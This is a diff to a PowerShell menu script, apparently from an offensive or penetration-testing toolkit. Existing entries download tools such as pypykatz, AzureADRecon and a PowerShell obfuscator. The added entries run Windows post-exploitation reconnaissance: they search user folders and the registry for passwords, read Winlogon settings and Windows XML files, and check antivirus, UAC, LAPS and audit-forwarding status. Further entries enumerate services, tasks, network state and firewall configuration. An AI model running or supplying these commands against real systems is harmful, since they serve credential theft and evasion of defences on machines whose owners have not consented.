@@ -856,6 +856,32 @@ while($true){
         '510' {Scarica "adrecon/AzureADRecon" "AzureADRecon.ps1" "adrecon/AzureADRecon/master/AzureADRecon.ps1"}
         '511' {ScaricaSSL "skelsec/pypykatz" "pypykatz.exe" "skelsec/pypykatz/releases/download/0.4.8/pypykatz.exe"}
         '512' {Scarica "GetRektBoy724/BetterXencrypt" "betterxencrypt.ps1" "GetRektBoy724/BetterXencrypt/main/betterxencrypt.ps1"}
+        '513' {netstat -ano | findstr /i listen}
+        '514' {hostname}
+        '515' {cmd /c 'reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI /s'}
+        '516' {cmd /c 'dir C:\Users /A /Q'}
+        '517' {foreach($KEYWD in $KEYWRDS){findstr /S $KEYWD C:\Users\*}}
+        '518' {reg query HKLM /f password /t REG_SZ /s /reg:64; reg query HKCU /f password /t REG_SZ /s /reg:64; reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /reg:64; foreach($XFL in (get-childitem -ErrorAction 'silentlycontinue' -recurse ($env:windir)*.xml).name){get-content $XFL}}
+        '519' {REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit}
+        '520' {REG QUERY HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager}
+        '521' {REG QUERY "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled}
+        '522' {REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA}
+        '523' {WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more}
+        '524' {schtasks /query /FO LIST /V}
+        '525' {get-content C:\WINDOWS\System32\drivers\etc\hosts | findstr /v "^#"}
+        '526' {ipconfig /displaydns | findstr "Record" | findstr "Name Host"}
+        '527' {ipconfig /all}
+        '528' {arp -a}
+        '529' {route PRINT}
+        '530' {netstat -p TCP}
+        '531' {netstat -p UDP}
+        '532' {netsh firewall show state; netsh firewall show config; netsh dump}
+        '533' {net start}
+        '534' {sc query; sc query state=all}
+        '535' {driverquery /V}
+        '536' {wmic service list brief; wmic service list config; wmic process; wmic service; wmic USERACCOUNT; wmic group list full; wmic nicconfig where IPenable='true'; wmic volume; wmic netuse list full; wmic qfe; wmic startup; wmic PRODUCT; wmic OS; wmic Timezone}
+        '537' {cmd /c 'dir /B /S C:\*mdb'}
+        '538' {dir /A C:\inetpub\wwwroot\}
         default{write-host 'ERROR: this choice is incorrect'}
     }
     read-host "Press ENTER to continue";
